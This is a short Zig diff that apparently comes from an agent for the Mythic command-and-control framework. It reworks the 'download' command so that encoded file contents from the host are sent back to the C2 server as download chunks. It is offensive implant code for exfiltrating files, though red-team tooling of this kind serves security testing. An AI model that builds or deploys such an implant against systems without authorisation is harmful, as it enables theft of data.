@@ -180,12 +180,20 @@ pub const CommandExecutor = struct {
         
         return MythicResponse{
             .task_id = task.id,
+            .download = types.DownloadInfo{
+                .chunk_num = 1,
+                .chunk_data = encoded_content,
+                .total_chunks = 1,
+                .full_path = null,
+                .chunk_size = encoded_content.len,
+                .is_screenshot = false,
+            },
             .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ task.parameters, file_content.len }),
             .completed = true,
             .status = "completed",
-            .artifacts = encoded_content,
         };
     }
+
     
     fn executeUpload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const parsed = json.parseFromSlice(json.Value, self.allocator, task.parameters, .{}) catch {
